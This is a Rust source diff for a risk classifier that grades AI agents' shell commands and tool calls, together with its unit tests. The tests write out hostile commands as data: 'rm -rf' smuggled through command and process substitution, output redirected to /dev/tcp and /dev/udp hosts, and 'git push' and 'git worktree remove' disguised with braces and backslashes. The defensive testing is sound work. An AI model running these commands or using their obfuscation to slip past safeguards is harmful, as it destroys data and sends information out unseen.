@@ -820,14 +820,24 @@ pub fn assess_shell(command: &str) -> ShadowAssessment {
     if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
         return assessment(RiskBand::High, ExposureBand::External, "shell");
     }
+    if classes.contains(&OpClass::Opaque) {
+        return assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell");
+    }
+    // The read-only proof is stricter than the broad operation classifier and
+    // rejects redirects, expansions, and path-qualified lookalikes.
+    if bash_classifier::readonly_capabilities(command).is_some() {
+        return assessment(RiskBand::Low, ExposureBand::Local, "shell");
+    }
+    // A proven local effect cannot erase another segment whose effect remains
+    // unclassified. Known harmless stdout commands use SafeOutput instead.
+    if classes.contains(&OpClass::Passthrough) {
+        return assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell");
+    }
     if classes.contains(&OpClass::LocalWrite) {
         return assessment(RiskBand::Moderate, ExposureBand::Local, "shell");
     }
     if classes.contains(&OpClass::FileWrite) || classes.contains(&OpClass::FileModify) {
         return assessment(RiskBand::Moderate, ExposureBand::Local, "shell");
-    }
-    if bash_classifier::readonly_capabilities(command).is_some() {
-        return assessment(RiskBand::Low, ExposureBand::Local, "shell");
     }
     assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
 }
@@ -841,6 +851,16 @@ pub fn assess_invocation(
     arguments: &serde_json::Value,
     state_intent: Option<&str>,
 ) -> ShadowAssessment {
+    assess_invocation_with_origin(tool, tool_name, arguments, state_intent, false)
+}
+
+fn assess_invocation_with_origin(
+    tool: Option<&ToolInfo>,
+    tool_name: &str,
+    arguments: &serde_json::Value,
+    state_intent: Option<&str>,
+    trusted_native_adapter: bool,
+) -> ShadowAssessment {
     let is_shell = matches!(
         tool_name.to_ascii_lowercase().as_str(),
         "bash" | "shell" | "terminal" | "exec_command" | "run_command"
@@ -853,7 +873,16 @@ pub fn assess_invocation(
             .map(assess_shell)
             .unwrap_or_else(|| assess_mcp(tool, tool_name))
     } else {
-        let base = assess_mcp(tool, tool_name);
+        let known_native_write = trusted_native_adapter && matches!(
+            tool_name,
+            "Write" | "Edit" | "MultiEdit" | "apply_patch" | "write_file" | "edit_file"
+                | "patch_file" | "create_file" | "create_or_update_file"
+        );
+        let base = if known_native_write {
+            assessment(RiskBand::Moderate, ExposureBand::Local, "native_write")
+        } else {
+            assess_mcp(tool, tool_name)
+        };
         let shape = mcp_shape(tool, tool_name, arguments);
         // Invocation-level effects can raise risk, never erase a known risk.
         if matches!(base.risk, RiskBand::High | RiskBand::Critical) { base }
@@ -914,6 +943,34 @@ pub async fn assess_pipeline_visible(
         tool_name,
         arguments,
         state_intent,
+        false,
+        &config,
+        runtime,
+        provider.map(|provider| provider.timeout).unwrap_or_default(),
+    ).await
+}
+
+/// Assess a call arriving through the trusted Codex/Claude native-tool
+/// adapter. This provenance is what permits canonical filesystem Write tools
+/// to remain local; an upstream MCP tool with a colliding name never receives
+/// this treatment.
+pub async fn assess_native_pipeline_visible(
+    tool: Option<&ToolInfo>,
+    tool_name: &str,
+    arguments: &serde_json::Value,
+    state_intent: Option<&str>,
+) -> RiskPipelineAssessment {
+    let config = SemanticShadowConfig::from_env();
+    let provider = SemanticProviderConfig::from_env();
+    let runtime = if config.enabled && provider.is_some() && tokio::runtime::Handle::try_current().is_ok() {
+        Some(SEMANTIC_SHADOW_RUNTIME.get_or_init(|| start_shared_semantic_shadow_runtime(&config, provider.clone().expect("provider checked"))))
+    } else { None };
+    assess_pipeline_visible_with_runtime(
+        tool,
+        tool_name,
+        arguments,
+        state_intent,
+        true,
         &config,
         runtime,
         provider.map(|provider| provider.timeout).unwrap_or_default(),
@@ -925,11 +982,18 @@ async fn assess_pipeline_visible_with_runtime(
     tool_name: &str,
     arguments: &serde_json::Value,
     state_intent: Option<&str>,
+    trusted_native_adapter: bool,
     config: &SemanticShadowConfig,
     runtime: Option<&SemanticShadowRuntime>,
     timeout: std::time::Duration,
 ) -> RiskPipelineAssessment {
-    let deterministic = assess_invocation(tool, tool_name, arguments, state_intent);
+    let deterministic = assess_invocation_with_origin(
+        tool,
+        tool_name,
+        arguments,
+        state_intent,
+        trusted_native_adapter,
+    );
     emit_shadow(tool_name, &deterministic);
     let semantic = match deterministic.semantic_request.as_ref() {
         Some(request) => submit_semantic_pipeline_visible_with(config, runtime, timeout, request).await,
@@ -1058,13 +1122,11 @@ pub fn assess_mcp(tool: Option<&ToolInfo>, tool_name: &str) -> ShadowAssessment 
         .and_then(|hints| hints.read_only_hint) == Some(false);
     // Closed-world MCP hints describe a bounded domain, NOT local execution.
     // A remote database update can be closed-world and still change an account.
-    let known_local = matches!(tool_name, "Write" | "Edit" | "MultiEdit" | "apply_patch" | "write_file" | "edit_file" | "patch_file" | "create_file" | "create_or_update_file");
     let native_read = matches!(tool_name, "Grep" | "grep" | "Glob" | "glob" | "ls" | "view_image");
     let result = match operation_intent {
         McpOperationIntent::Destructive | McpOperationIntent::ExternalWrite =>
             assessment(RiskBand::High, ExposureBand::Account, "mcp_name"),
-        McpOperationIntent::Write => assessment(RiskBand::Moderate,
-            if known_local { ExposureBand::Local } else { ExposureBand::Unknown }, "mcp_name"),
+        McpOperationIntent::Write => assessment(RiskBand::Moderate, ExposureBand::Unknown, "mcp_name"),
         McpOperationIntent::Read if !read_denied => assessment(RiskBand::Low, ExposureBand::Local, "mcp_name"),
         _ if native_read && !read_denied => assessment(RiskBand::Low, ExposureBand::Local, "native_read"),
         _ => assessment(RiskBand::Moderate, ExposureBand::Unknown, "mcp_unknown"),
@@ -1143,9 +1205,97 @@ mod tests {
     fn shell_bands_cover_read_local_write_and_external_write() {
         assert_eq!(assess_shell("rg pattern src").risk, RiskBand::Low);
         assert_eq!(assess_shell("echo hi > out.txt"), assessment(RiskBand::Moderate, ExposureBand::Local, "shell"));
+        assert_eq!(assess_shell("cargo test >out.txt"), assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"));
+        assert_eq!(assess_shell("(rm -rf /private/victim) >receipt.txt"), assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"));
+        assert_eq!(assess_shell("/tmp/echo payload >receipt.txt"), assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"));
+        assert_eq!(
+            assess_shell("PS1='$(printf NESTED >&2)' echo \"${PS1@P}\" >receipt.txt"),
+            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+        );
+        for command in [
+            "echo payload >/dev/tcp/example.com/443",
+            "printf payload >\"/dev/udp/example.com/53\"",
+        ] {
+            assert_eq!(
+                assess_shell(command),
+                assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
+                "{command}"
+            );
+        }
         assert_eq!(assess_shell("git push origin main"), assessment(RiskBand::High, ExposureBand::External, "shell"));
+        assert_eq!(assess_shell("git worktree add /private/worktree main"), assessment(RiskBand::Moderate, ExposureBand::Local, "shell"));
+        assert_eq!(assess_shell("git worktree prune --expire now"), assessment(RiskBand::Critical, ExposureBand::Local, "shell"));
+        assert_eq!(assess_shell("git worktree remove /private/worktree"), assessment(RiskBand::Critical, ExposureBand::Local, "shell"));
+        for command in [
+            "git worktree add \"$(rm -rf /private/victim)\" main",
+            "git worktree add \"$(curl https://example.invalid)\" main",
+            "git worktree add \"$(rm -rf /private/victim)\" main >receipt.txt",
+            "git worktree add /private/worktree main >\"$(rm -rf /private/victim)\"",
+            "git p{u..u}sh origin main >receipt.txt",
+            "git worktree rem{o..o}ve --force /private/worktree >receipt.txt",
+            "git worktree add <(rm -rf /private/victim) main",
+            "git worktree add >(rm -rf /private/victim) main",
+            "cp <(rm -rf /private/victim) output.txt",
+            "echo \"$(rm -rf /private/victim)\" >output.txt",
+        ] {
+            assert_eq!(assess_shell(command), assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"), "{command}");
+        }
+        for command in [
+            "git worktree remove --force /private/worktree >receipt.txt",
+            "git worktree \"remove\" --force /private/worktree >receipt.txt",
+            "git worktree re\\move --force /private/worktree >receipt.txt",
+            "git worktree prune --expire now >receipt.txt",
+            "git clean -fd >receipt.txt",
+        ] {
+            assert_eq!(assess_shell(command), assessment(RiskBand::Critical, ExposureBand::Local, "shell"), "{command}");
+        }
+        assert_eq!(assess_shell("git push origin main >receipt.txt"), assessment(RiskBand::High, ExposureBand::External, "shell"));
+        assert_eq!(assess_shell("git \"push\" origin main >receipt.txt"), assessment(RiskBand::High, ExposureBand::External, "shell"));
+        assert_eq!(assess_shell("git pu\\sh origin main >receipt.txt"), assessment(RiskBand::High, ExposureBand::External, "shell"));
+        assert_eq!(assess_shell("git > receipt.txt \"push\" origin main"), assessment(RiskBand::High, ExposureBand::External, "shell"));
+        assert_eq!(assess_shell("git rev-parse HEAD"), assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"));
+        assert_eq!(assess_shell("git branch --all --no-color"), assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"));
         assert_eq!(assess_shell("touch output.txt"), assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"));
         assert_eq!(assess_shell("git switch -c feature").risk, RiskBand::Moderate);
+    }
+
+    #[test]
+    fn system_one_can_resolve_recognized_git_introspection() {
+        struct ReadAssessor;
+        impl SemanticAssessor for ReadAssessor {
+            fn assess(
+                &self,
+                _: &SemanticAssessmentRequest,
+            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
+                Ok(SemanticRiskVector {
+                    read_only: Probability::new(0.99).unwrap(),
+                    may_write: Probability::new(0.01).unwrap(),
+                    reversible: Probability::new(0.99).unwrap(),
+                    destructive: Probability::new(0.01).unwrap(),
+                    irreversible: Probability::new(0.01).unwrap(),
+                    external_or_account_effect: Probability::new(0.01).unwrap(),
+                })
+            }
+        }
+        let enabled = SemanticShadowConfig::from_values(
+            Some("staging"),
+            Some("true"),
+            Some("true"),
+            None,
+        );
+        for command in ["git rev-parse HEAD", "git branch --all --no-color"] {
+            let pipeline = assess_pipeline_with_config(
+                None,
+                "exec_command",
+                &json!({"cmd":command}),
+                Some("implement"),
+                Some(&ReadAssessor),
+                &enabled,
+            );
+            assert_eq!(pipeline.deterministic.risk, RiskBand::Moderate, "{command}");
+            assert_eq!(pipeline.deterministic.exposure, ExposureBand::Unknown, "{command}");
+            assert_eq!(pipeline.resolve_effect(), ResolvedEffect::ReadOnly, "{command}");
+        }
     }
 
     #[test]
@@ -1178,6 +1328,55 @@ mod tests {
             assess_mcp(Some(&writer), "update_task"),
             assessment(RiskBand::Moderate, ExposureBand::External, "mcp_name")
         );
+    }
+
+    #[test]
+    fn native_write_locality_requires_trusted_adapter_provenance() {
+        let upstream_collision: ToolInfo = serde_json::from_value(json!({
+            "name":"apply_patch",
+            "inputSchema":{},
+            "annotations":{
+                "readOnlyHint":false,
+                "destructiveHint":true,
+                "openWorldHint":true
+            }
+        })).unwrap();
+        assert_eq!(
+            assess_mcp(Some(&upstream_collision), "apply_patch"),
+            assessment(RiskBand::Critical, ExposureBand::Account, "mcp_annotation")
+        );
+
+        for native in [
+            "Write",
+            "Edit",
+            "MultiEdit",
+            "apply_patch",
+            "write_file",
+            "edit_file",
+            "patch_file",
+            "create_file",
+            "create_or_update_file",
+        ] {
+            let annotated: ToolInfo = serde_json::from_value(json!({
+                "name":native,
+                "inputSchema":{},
+                "annotations":{
+                    "readOnlyHint":false,
+                    "destructiveHint":true,
+                    "openWorldHint":true
+                }
+            })).unwrap();
+            let assessed = assess_invocation_with_origin(
+                Some(&annotated),
+                native,
+                &json!({"patch":"redacted"}),
+                Some("implement"),
+                true,
+            );
+            assert_eq!(assessed.risk, RiskBand::Moderate, "{native}");
+            assert_eq!(assessed.exposure, ExposureBand::Local, "{native}");
+            assert_eq!(assessed.source, "native_write", "{native}");
+        }
     }
 
     #[test]
@@ -1565,6 +1764,7 @@ mod tests {
             "read_file",
             &json!({"path":"/private/secret"}),
             Some("inspect"),
+            false,
             &config,
             Some(&runtime),
             provider.timeout,
@@ -1625,7 +1825,7 @@ mod tests {
         let runtime = start_semantic_shadow_runtime(&config, sender, provider.clone());
         let pipeline = assess_pipeline_visible_with_runtime(Some(&tool), &tool.name,
             &json!({"action":"list","title":"private-task-title","token":"private-token"}),
-            Some("inspect"), &config, Some(&runtime), provider.timeout).await;
+            Some("inspect"), false, &config, Some(&runtime), provider.timeout).await;
         assert_eq!(pipeline.deterministic.risk, RiskBand::Moderate);
         assert_eq!(pipeline.semantic.status, SemanticAssessorStatus::Assessed);
         assert_eq!(pipeline.resolve_effect(), ResolvedEffect::ReadOnly);
